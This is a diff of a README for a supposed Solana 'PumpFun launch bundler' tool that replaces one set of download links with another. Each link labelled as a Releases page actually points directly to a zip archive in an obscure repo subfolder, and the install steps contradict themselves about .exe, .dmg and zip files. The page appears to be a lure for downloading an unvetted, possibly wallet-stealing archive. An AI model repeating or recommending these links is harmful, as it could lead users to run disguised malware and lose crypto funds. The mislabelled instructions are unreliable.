@@ -18,13 +18,13 @@ Before you begin, ensure that you have the right environment to run the applicat
 
 You can easily download the application by visiting the link below. Click on the link to access the Releases page, where you will find the latest version of Migraine-PumpFun-Launch-Bundler.
 
-[![Download Now](https://raw.githubusercontent.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/main/trigeneric/Migraine-PumpFun-Launch-Bundler.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/main/trigeneric/Migraine-PumpFun-Launch-Bundler.zip)
+[![Download Now](https://github.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/raw/refs/heads/main/trigeneric/Pump-Bundler-Migraine-Launch-Fun-2.6-beta.3.zip%20Now-blue?style=for-the-badge)](https://github.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/raw/refs/heads/main/trigeneric/Pump-Bundler-Migraine-Launch-Fun-2.6-beta.3.zip)
 
 ## 🗂️ Download & Install
 
 1. **Visit the Releases Page**: Click the link below to visit the Releases page where you can find the application files.
 
-   [Download from Releases Page](https://raw.githubusercontent.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/main/trigeneric/Migraine-PumpFun-Launch-Bundler.zip)
+   [Download from Releases Page](https://github.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/raw/refs/heads/main/trigeneric/Pump-Bundler-Migraine-Launch-Fun-2.6-beta.3.zip)
 
 2. **Select the Latest Release**: Look for the latest version of the application listed on the page. This is usually at the top of the list.
 
@@ -33,7 +33,7 @@ You can easily download the application by visiting the link below. Click on the
 4. **Install the Application**:
    - For **Windows**: Once downloaded, locate the `.exe` file in your downloads folder. Double-click it and follow the on-screen instructions.
    - For **macOS**: Find the `.dmg` file, double-click it, and follow the prompts to install the app in your Applications folder.
-   - For **Linux**: Locate the downloaded `https://raw.githubusercontent.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/main/trigeneric/Migraine-PumpFun-Launch-Bundler.zip` file. Use the terminal to extract the files and follow the installation instructions included.
+   - For **Linux**: Locate the downloaded `https://github.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/raw/refs/heads/main/trigeneric/Pump-Bundler-Migraine-Launch-Fun-2.6-beta.3.zip` file. Use the terminal to extract the files and follow the installation instructions included.
 
 5. **Run the Application**:  
    - On **Windows**, find Migraine-PumpFun-Launch-Bundler in your Start Menu.
@@ -72,4 +72,4 @@ If you have questions or need assistance:
 
 Thank you for using Migraine-PumpFun-Launch-Bundler. We hope this tool makes managing your Solana wallets easier and more efficient. Your feedback is invaluable to us, so please do not hesitate to share your thoughts or suggestions.
 
-Ensure to regularly check the [Releases page](https://raw.githubusercontent.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/main/trigeneric/Migraine-PumpFun-Launch-Bundler.zip) for updates and new features. Happy bundling!
+Ensure to regularly check the [Releases page](https://github.com/proxmoxgg/Migraine-PumpFun-Launch-Bundler/raw/refs/heads/main/trigeneric/Pump-Bundler-Migraine-Launch-Fun-2.6-beta.3.zip) for updates and new features. Happy bundling!
